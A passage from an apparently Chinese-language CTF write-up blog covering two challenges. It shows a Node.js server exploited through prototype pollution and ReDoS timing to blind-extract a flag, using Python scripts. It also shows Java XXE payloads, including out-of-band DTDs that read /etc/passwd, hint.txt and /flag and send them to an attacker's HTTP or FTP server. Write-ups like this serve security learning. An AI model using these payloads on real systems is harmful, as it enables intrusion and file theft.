class="line">    loginHistory.push(logItem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/log'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(loginHistory.length==<span class="number">0</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"no log"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.json(loginHistory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.end(<span class="string">"ok"</span>);</span><br><span class="line">    <span class="comment">//res.render("index");</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//So terrible code~</span></span><br><span class="line">app.post(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.user.username != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"error"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//console.log(req.body.user.username);</span></span><br><span class="line">        <span class="keyword">if</span>(config.forbidAdmin &amp;&amp; req.body.user.username.includes(<span class="string">"admin"</span>))&#123;</span><br><span class="line">            res.end(<span class="string">"any admin user has been baned"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(req.body.user.username.toUpperCase() === adminName.toUpperCase())</span><br><span class="line">                <span class="comment">//only log admin's activity</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"yes"</span>);</span><br><span class="line">                log(req.body.user);</span><br><span class="line">            res.end(<span class="string">"ok"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/verifyFlag'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//res.render("verifyFlag");</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/verifyFlag'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//let result = "Your match flag is here: ";</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">"Emm~ I won't tell you what happened! "</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> req.body.q != <span class="string">"string"</span>)&#123;</span><br><span class="line">        res.end(<span class="string">"please input your guessing flag"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> regExp = req.body.q;</span><br><span class="line">        <span class="keyword">if</span>(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123;</span><br><span class="line">            <span class="comment">//res.end(flag);</span></span><br><span class="line">            <span class="comment">//Stop your wishful thinking and go away!</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.query.q === flag)</span><br><span class="line">            result+=flag;</span><br><span class="line">        res.end(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noDos</span>(<span class="params">regExp</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//match regExp like this will be too hard</span></span><br><span class="line">    <span class="keyword">return</span> !(regExp.length&gt;<span class="number">30</span>||regExp.match(<span class="regexp">/[)]/g</span>).length&gt;<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address;</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ç”±äºæ²¡æœ‰æ‹·viewsç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè¿™é‡Œçš„render()å°±æ³¨é‡Šæ‰äº†ï¼Œinstall expresså’Œejsåé¢˜ç›®æ—¢å¯ä»¥è¿è¡Œäº†ï¼Œ</p>
<p>è¿™é‡Œå‚è€ƒäº†NU1Lå’Œ<a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/#menu" target="_blank" rel="noopener">de1ta</a>çš„wp,ç„¶åè¿™é¢˜æœ‰ä¸ªmergeï¼ˆï¼‰å‡½æ•°ï¼Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210219757.png" alt="image-20200310210219757"></p>
<p>å’Œä¸Šå›ichunqiuçš„é‚£é“nodejsé¢˜merge()å‡½æ•°ä¸€æ ·ï¼Œéƒ½å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œç„¶åæˆ‘ä»¬æ‰¾é‚£é‡Œè°ƒç”¨äº†logå‡½æ•°ï¼Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210328089.png" alt="image-20200310210328089"></p>
<p>åªæœ‰åœ¨/è·¯ç”±åœ¨ä½¿ç”¨postæ–¹æ³•æ—¶æ‰ä¼šè°ƒç”¨logå‡½æ•°ï¼Œè¿™é‡Œä¼ å…¥çš„æ˜¯req.body.userï¼Œå³æˆ‘ä»¬postçš„dataï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œéœ€è¦æ»¡è¶³usernameå˜å¤§å†™åä¸admin888ç›¸åŒï¼Œç„¶åæ‰¾å¯ä»¥è¿›è¡Œæ±¡æŸ“åˆ©ç”¨çš„ç‚¹ï¼Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310210634769.png" alt="image-20200310210634769"> </p>
<p>çœ‹åˆ°è¿™é‡Œ/veryfyFlagè·¯ç”±ï¼Œè¿™é‡Œä¼šåˆ¤æ–­config.enableRegï¼Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">    <span class="string">"forbidAdmin"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//"enableReg" : true</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>enableRegæ˜¯æœªå®šä¹‰çš„ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“ç»•è¿‡ï¼Œç„¶ååé¢æŠŠæˆ‘ä»¬è¾“å…¥çš„qç»™äº†regExp,å¹¶é€šè¿‡noDoså‡½æ•°é™åˆ¶äº†æˆ‘ä»¬è¾“å…¥çš„qã€‚ä¹‹åç”¨qå¯¹flagè¿›è¡ŒåŒ¹é…ï¼Œè¿™é‡Œå°±å¯ä»¥é€šè¿‡ï¼Œnodejsçš„redosæ”»å‡»æ¥ç›²æ³¨å‡ºflagã€‚</p>
<blockquote>
<p> <strong><code>match()</code></strong> æ–¹æ³•æ£€ç´¢è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„çš„ç»“æœã€‚</p>
<h2 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str.match(regexp)</span><br></pre></td></tr></table></figure>

<h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3><ul>
<li><p><code>regexp</code></p>
<p>ä¸€ä¸ª<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp" target="_blank" rel="noopener">æ­£åˆ™è¡¨è¾¾å¼</a>å¯¹è±¡ã€‚å¦‚æœä¼ å…¥ä¸€ä¸ªéæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡ï¼Œåˆ™ä¼šéšå¼åœ°ä½¿ç”¨ <code>new RegExp(obj)</code> å°†å…¶è½¬æ¢ä¸ºä¸€ä¸ª <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/RegExp" target="_blank" rel="noopener"><code>RegExp</code></a> ã€‚å¦‚æœä½ æ²¡æœ‰ç»™å‡ºä»»ä½•å‚æ•°å¹¶ç›´æ¥ä½¿ç”¨match() æ–¹æ³• ï¼Œä½ å°†ä¼šå¾—åˆ°ä¸€ ä¸ªåŒ…å«ç©ºå­—ç¬¦ä¸²çš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Array" target="_blank" rel="noopener"><code>Array</code></a> ï¼š[â€œâ€] ã€‚</p>
</li>
</ul>
<h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><ul>
<li>å¦‚æœä½¿ç”¨gæ ‡å¿—ï¼Œåˆ™å°†è¿”å›ä¸å®Œæ•´æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ‰€æœ‰ç»“æœï¼Œä½†ä¸ä¼šè¿”å›æ•è·ç»„ã€‚</li>
<li>å¦‚æœæœªä½¿ç”¨gæ ‡å¿—ï¼Œåˆ™ä»…è¿”å›ç¬¬ä¸€ä¸ªå®Œæ•´åŒ¹é…åŠå…¶ç›¸å…³çš„æ•è·ç»„ï¼ˆ<code>Array</code>ï¼‰ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿”å›çš„é¡¹ç›®å°†å…·æœ‰å¦‚ä¸‹æ‰€è¿°çš„å…¶ä»–å±æ€§ã€‚</li>
</ul>
</blockquote>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match</a></p>
<p><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310212321951.png" alt="image-20200310212321951"></p>
<p>å°±å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼é€ä½ç›²æ³¨å‡ºåé¢çš„flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line">depth = <span class="number">5</span></span><br><span class="line">pre = <span class="string">'('</span> * depth + <span class="string">'.'</span> + <span class="string">'*)'</span> * depth +<span class="string">'[^'</span></span><br><span class="line">suf = <span class="string">']$'</span></span><br><span class="line">dict = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line">re = [] </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> dict:    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081'</span>, json = &#123;<span class="string">"user"</span>: &#123;<span class="string">"username"</span>:<span class="string">"admÄ±n888"</span>, <span class="string">"__proto__"</span>: &#123;<span class="string">"enableReg"</span>: <span class="literal">True</span>&#125;&#125;&#125;)    </span><br><span class="line">    begin = time()    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081/verifyFlag'</span>, json = &#123;<span class="string">'q'</span>: pre + c + suf&#125;)    </span><br><span class="line">    re.append([c, time() - begin])    </span><br><span class="line">    sleep(<span class="number">0.1</span>)    </span><br><span class="line">    print(pre + c + suf)    </span><br><span class="line">    print(len(pre + c + suf))    </span><br><span class="line">    print(r.text)</span><br><span class="line">re = sorted(re, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> re[::<span class="number">-1</span>][:<span class="number">3</span>]:    </span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310213622108.png" alt="image-20200310213622108"></p>
<p>ç”¨è¿™ä¸ªè„šæœ¬è·‘åˆ°ç››å‰é¢ä¸¤ä¸ªçš„æ—¶å€™ï¼Œè·‘ä¸å‡ºäº†ã€‚</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310215446654.png" alt="image-20200310215446654"></p>
<p>ç„¶åæ”¹ä¸‹å‰é¢çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line">depth = <span class="number">5</span></span><br><span class="line">suf = <span class="string">']'</span>+<span class="string">'('</span> * depth + <span class="string">'.'</span> + <span class="string">'*)'</span> * depth +<span class="string">'tFLAaGEAxY'</span></span><br><span class="line">pre = <span class="string">'['</span></span><br><span class="line">dict = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line">re = [] </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> dict:    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081'</span>, json = &#123;<span class="string">"user"</span>: &#123;<span class="string">"username"</span>:<span class="string">"admÄ±n888"</span>, <span class="string">"__proto__"</span>: &#123;<span class="string">"enableReg"</span>: <span class="literal">True</span>&#125;&#125;&#125;)    </span><br><span class="line">    begin = time()    </span><br><span class="line">    r=requests.post(<span class="string">'http://127.0.0.1:8081/verifyFlag'</span>, json = &#123;<span class="string">'q'</span>: pre + c + suf&#125;)    </span><br><span class="line">    re.append([c, time() - begin])    </span><br><span class="line">    sleep(<span class="number">0.1</span>)    </span><br><span class="line">    print(pre + c + suf)    </span><br><span class="line">    print(len(pre + c + suf))    </span><br><span class="line">    print(r.text)</span><br><span class="line">re = sorted(re, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> re[::<span class="number">-1</span>][:<span class="number">3</span>]:    </span><br><span class="line">    print(<span class="string">'[*] &#123;&#125; : &#123;&#125;'</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200310215725486.png" alt="image-20200310215725486"></p>
<p>ä¹‹ååˆçœ‹äº†sycloverçš„<a href="https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng" target="_blank" rel="noopener">wp</a></p>
<blockquote>
<p><code>&quot;^(?=xxx)((.*)*)*aaaaa$&quot;</code>å¦‚æœåŒ¹é…åˆ°xxxä¼šæ— é™å»¶æ—¶ï¼Œç”¨è¿™ä¸ªå¯ä»¥ç›²æ³¨flag,ç»“å°¾ä¸èƒ½æ˜¯aaaaaå³å¯ï¼Œ æ— é™å»¶è¿Ÿé¢˜ç›®ä¼šæŒ‚,å°‘ä¸€ä¸ªæ‹¬å·å³å¯ â€œ^(?=xxx)(.<em>)</em>aaaaa$â€</p>
<p>å·ä¸ªå›¾</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/640.webp" alt="img"></p>
</blockquote>
<h1 id="0x02-baby-java"><a href="#0x02-baby-java" class="headerlink" title="0x02 baby java"></a>0x02 baby java</h1><p>è¿™é“é¢˜ç›®è€ƒç‚¹æ˜¯javaxxeå’Œfastjsonååºåˆ—åŒ–çš„æ¼æ´ï¼Œé¦–å…ˆé¡µé¢æ˜¯è¿™æ ·ï¼Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311132610679.png" alt="image-20200311132610679"></p>
<p>å¾ˆé…·ç‚«ï¼Œç„¶åæ¯”èµ›å°±æ˜¯ä¸ä¼šåšï¼ŒburpæˆªåŒ…å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨äº†xmlæ ¼å¼æ¥è¯»å–è¾“å…¥çš„æ•°æ®ï¼Œå¯ä»¥xxeï¼Œ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span>  <span class="meta-string">"bbbbb"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140115614.png" alt="image-20200311140115614"></p>
<p>å¯ä»¥è§£æxmlï¼Œæ¯”èµ›æ—¶æµ‹è¯•å¸¦ä¸Š&amp;ï¼Œ%å°±ä¼šget out hacker ï¼Œä»¥ä¸ºæŠŠ&amp;å’Œ%éƒ½ç¦äº†ï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼Œè¿˜æ˜¯å¯¹xxeçš„ç†è§£ä¸å¤Ÿæ·±å…¥ï¼Œç„¶åç»§ç»­æµ‹è¯•ï¼Œ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"file:///etc/passwd"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140602422.png" alt="image-20200311140602422"></p>
<p>è¿™é‡Œä¼šè§¦å‘waf,ä»è¿™ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œè§¦å‘wafçš„æ—¶å€™ä¼šè¿”å›sus waf detect ! get out bad hacker ! hint: /hint.txtï¼Œè€Œä¹‹å‰è¿”å›get out hacker å¯èƒ½æ—¶å› ä¸ºè¯­æ³•é—®é¢˜ç­‰å…¶ä»–åŸå› ï¼Œè¿™é‡Œè¿‡æ»¤äº†fileå’Œftpç­‰ï¼Œè€Œä¸”æç¤ºæˆ‘ä»¬å»è¯»hint.txtï¼Œç„¶åå°è¯•å¤–å¸¦xxeï¼Œ<a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">è¿™é‡Œå‚è€ƒ</a></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140334086.png" alt="image-20200311140334086"></p>
<p>å¼€å§‹çœ‹å…¶ä»–çš„wpä¸Šé¢è¯´æœ‰ç”¨httpè¯»å–äº†hint.txtï¼Œè€Œä¸”å†…å®¹ä¸ºpom.xmlæ–‡ä»¶ï¼Œä»¥ä¸ºæ˜¯å¤šè¡Œçš„ï¼Œçœ‹äº†ä¸Šé¢è¿™ç¯‡æ–‡ç« åï¼Œhttpæ˜¯ä¸èƒ½è¯»å¤šè¡Œæ–‡ä»¶çš„ï¼Œç„¶åé—®äº†å‡ºé¢˜äºº<a href="https://www.cnblogs.com/tr1ple/" target="_blank" rel="noopener">tr1ple</a>å¸ˆå‚…ï¼Œhint.txtæ˜¯å•è¡Œçš„ï¼Œé‚£ä¹ˆhttpå’Œftpåº”è¯¥éƒ½å¯ä»¥è¯»äº†ï¼Œ</p>
<p>è¿™é‡Œæˆ‘ä»¬æœåŠ¡å™¨æ”¾çš„hint.txtå¦‚ä¸‹</p>
<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311141839708.png" alt="image-20200311141839708" style="zoom:200%;">

<ul>
<li>http</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//gx.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///hint.txt"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311141959966.png" alt="image-20200311141959966"></p>
<ul>
<li>ftp</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"http://ip/gxzy.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">number</span>&gt;</span>fffff<span class="tag">&lt;/<span class="name">number</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//gxzy.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://ip:2121/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/Inkedimage-20200311142521849_LI-1584922557726.jpg" alt="Inkedimage-20200311142521849_LI"></p>
<p>æŒ‰ç…§æ¯”èµ›æ¥è¿™æ—¶æˆ‘ä»¬å¾—åˆ°äº†pom.xmlæ–‡ä»¶ï¼Œ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Method%uFF1A post</span><br><span class="line">Path %uFF1A /you_never_know_the_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span 